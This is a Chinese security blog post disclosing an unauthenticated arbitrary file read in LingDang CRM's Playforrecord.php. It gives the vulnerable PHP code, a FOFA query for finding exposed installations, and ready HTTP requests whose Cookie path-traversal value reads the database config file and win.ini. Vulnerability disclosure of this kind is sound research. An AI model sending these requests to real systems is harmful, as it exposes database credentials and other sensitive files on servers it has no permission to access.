---
title: "灵当CRM Playforrecord.php 文件读取漏洞"
source: https://mrxn.net/jswz/51mis-modules-Accounts-Playforrecord-download-fileread.html
asset_dir: assets/灵当crm-playforrecord.php-文件读取漏洞
---

# 灵当CRM Playforrecord.php 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/23 08:30
* 1308浏览
* [0评论](#comment)
* 16分钟阅读

深入探索

客户关系管理

数据库

应用


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

灵当CRM是一款专为中小企业打造的智能[客户关系管理](#)工具，由上海灵当信息科技有限公司开发并运营。广泛应用于金融、教育、医疗、IT服务、房地产等多个行业领域，帮助企业实现客户个性化管理需求，提升企业竞争力。无论是新客户开拓、老客户维护，还是销售过程管理、服务管理等方面，灵当CRM都能提供全面、高效的解决方案。是一款功能全面、用户友好、支持定制化、数据分析强大且价格合理的CRM软件，是中小型企业实现销售、服务、财务一体化管理的理想选择。灵当CRM `/crm/modules/Accounts/Playforrecord.php` 接口存在任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

客户关系管理

# 影响版本

# fofa语法

> `body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")`

# 漏洞分析

直接看 `/crm/modules/Accounts/Playforrecord.php` 的业务实现逻辑如下

深入探索

恶意软件分析工具

JSON处理工具

授权

```
<?php
if(!empty($_REQUEST['download'])){
    downfile2($_REQUEST['download']);
}else{
    global $adb;
    global $current_user;
    $newfolder='';
    $languageType= getLanguageType($current_user);
    $smarty = new lingdangCRM_Smarty;
    $smarty->display("Playforrecord.tpl");
}
function downfile2($fileurl)
{
    ob_start();
    $filename=$fileurl;
    $date=date("Ymd-H:i:m");
    header( "Content-type:   application/octet-stream ");
    header( "Accept-Ranges:   bytes ");
    header( "Content-Disposition:   attachment;   filename= {$date}.wav");
    $size=readfile($filename);
    header( "Accept-Length: " .$size);
}
```

将 `download` 参数的值无任何过滤和校验就带入 `downfile2` 方法中，而其直接使用 `readfile` 方法进行文件操作，因此直接跟文件路径或者利用PHP伪协议 `file:///` 读取系统任意文件，造成任意文件读取漏洞。因其使用 `$_REQUEST` 进行获取参数，因此支持 GET POST COOKIE三种方式传参，需要注意。

漏洞修复方案

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用-读取数据库配置信息

编程

```
GET /crm/modules/Accounts/Playforrecord.php HTTP/1.1
Host: 51mis.mrxn.net
Cookie: download=../../config.inc.php
```

深入探索

SQL注入防护

网络安全会议

漏洞扫描服务

或者 读取系统其他位置文件，如 `c:/windows/win.ini`

```
GET /crm/modules/Accounts/Playforrecord.php HTTP/1.1
Host: 51mis.mrxn.net
Cookie: download=file:///c:/windows/win.ini
```

[![灵当CRM Playforrecord.php 文件读取漏洞](images/img-001-6876e58eba76.webp)](https://image.mrxn.net/fc8ae9764ecf40c989c7d736b36e4faa.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[灵当CRM Playforrecord.php 文件读取漏洞](https://mrxn.net/jswz/51mis-modules-Accounts-Playforrecord-download-fileread.html)  
文章链接：<https://mrxn.net/jswz/51mis-modules-Accounts-Playforrecord-download-fileread.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

物流软件安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/51mis-modules-Accounts-Playforrecord-download-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

Windows安全工具

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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